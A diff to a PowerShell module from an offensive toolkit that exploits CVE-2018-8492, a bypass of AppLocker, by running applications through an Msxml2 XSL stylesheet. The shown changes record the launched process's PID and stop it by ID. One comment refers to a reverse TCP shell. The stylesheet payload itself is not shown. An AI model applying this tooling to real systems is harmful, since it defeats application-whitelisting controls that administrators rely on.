@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19042) x64 bits
    Required Dependencies: Msxml2 -com Object {native}
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.1.9
+   PS cmdlet Dev version: v1.1.10
 
 .DESCRIPTION
    AppLockerXml.ps1 module Checks\Exploits CVE-2018-8492 security bypass vulnerability in
@@ -66,7 +66,7 @@
    creating Msxml2 COM Object to load xml file!
    trying to execute yUeInzP.xml stylesheet file!
 
-   ScanResults         : XML successfully executed application!
+   ScanResults         : XML successfully executed application PID:5636!
 
 .LINK
    https://github.com/r00t-3xp10it/redpill
@@ -225,15 +225,15 @@ If($Action -ieq "XmlBypass"){
    try{
 
       ## Check if sellected application was successfully executed!
-      $CheckApplState = (Get-Process -Name "$StopProc" -EA SilentlyContinue).Responding |
-         Select-Object -Last 1
+      $CheckApplIdState = (Get-Process -Name "$StopProc" -EA SilentlyContinue).Id |
+         Select-Object -First 1 ## NOTE: The 'First' one its the LAST record added to List!
 
    }catch{}
 
 
    Start-Sleep -Seconds 1
-   If($CheckApplState -ieq "True"){## Executed application output table!
-      Write-Host "`nScanResults          : XML successfully executed application!" -ForegroundColor Green -BackGroundColor Black
+   If($CheckApplIdState -ne $null){## Executed application output table!
+      Write-Host "`nScanResults          : XML successfully executed application PID:$CheckApplIdState!" -ForegroundColor Green -BackGroundColor Black
    }Else{## NOt executed application output teble!
       Write-Host "`nScanResults          : XML failed to execute application!" -ForegroundColor Red -BackgroundColor Black
    }
@@ -241,9 +241,25 @@ If($Action -ieq "XmlBypass"){
 
    If($TimeOpen -ne '0'){## Close appl after -TimeOpen reached!
       If(-not($TimeOpen -eq 1)){Start-Sleep -Seconds $TimeOpen}
-      If($StopProc -iNotMatch '(powershell)$'){## Stops only process NOT matching powershell!
-         Stop-Process -Name $StopProc -Force -EA SilentlyContinue
+
+      If($CheckApplIdState -ne $null){
+
+         ## Stop Process by is 'Id' number identifier! (PID)
+         Stop-Process -Id $CheckApplIdState -Force -EA SilentlyContinue
+      
+      }Else{## Stop Process by is 'NAME' identifier! (As Last Resource)
+      
+         If($StopProc -iNotMatch '^(powershell)$'){## Dont stop powershell process!
+
+            ## Dont Stop Powershell Process without ChildProcess Id number OR else
+            # Stop-Process cmdlet will Stop 'ALL' powershell process's (parent and child)
+            # Example: RevTCPshell(parent) + SpawnedChildProcess(Child) will be terminated!
+            Stop-Process -Name $StopProc -Force -EA SilentlyContinue
+
+         }
+
       }
+
    }
       
    ## Delete artifacts left behind! 
